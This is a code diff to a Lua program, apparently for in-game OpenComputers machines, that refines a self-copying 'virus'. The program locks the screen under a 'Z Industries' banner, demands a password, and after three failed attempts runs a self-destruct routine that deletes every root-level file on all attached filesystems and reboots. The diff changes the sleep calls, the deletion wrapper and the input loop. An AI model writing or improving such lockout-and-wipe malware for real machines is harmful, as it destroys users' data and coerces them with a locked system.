@@ -10,6 +10,13 @@ local ATTEMPT_DELAY = 5
 local MAX_ATTEMPTS = 3
 local attempts = 0
 
+function Sleep(timeout)
+  local deadline = computer.uptime() + timeout
+  repeat
+    computer.pullSignal(math.max(0, deadline - computer.uptime()))
+  until computer.uptime() >= deadline
+end
+
 function lockScreen()
   term.clear()
   term.write("=== Système verrouillé par Z Industries ===\n")
@@ -20,20 +27,22 @@ function selfDestruct()
   term.clear()
   term.write("[ALERTE] Tentatives excessives détectées\n")
   term.write("Initialisation de l'autodestruction...\n")
-  os.sleep(2)
+  Sleep(2)
 
   -- Suppression de tous les fichiers sur tous les disques
   for address in component.list("filesystem") do
     local fs = component.proxy(address)
     if fs then
       for file in fs.list("/") or {} do
-        pcall(fs.remove, "/" .. file)
+        pcall(function()
+          fs.remove("/" .. file)
+        end)
       end
     end
   end
 
   term.write("Destruction terminée. Adieu.\n")
-  os.sleep(3)
+  Sleep(3)
   computer.shutdown(true)
 end
 
@@ -60,7 +69,7 @@ end
 function main()
   copyVirus()
   lockScreen()
-  while true do
+  while attempts < MAX_ATTEMPTS do
     term.write("> ")
     local input = term.read()
     if input then
@@ -73,7 +82,7 @@ function main()
         if attempts >= MAX_ATTEMPTS then
           selfDestruct()
         end
-        os.sleep(ATTEMPT_DELAY)
+        Sleep(ATTEMPT_DELAY)
         lockScreen()
       end
     end
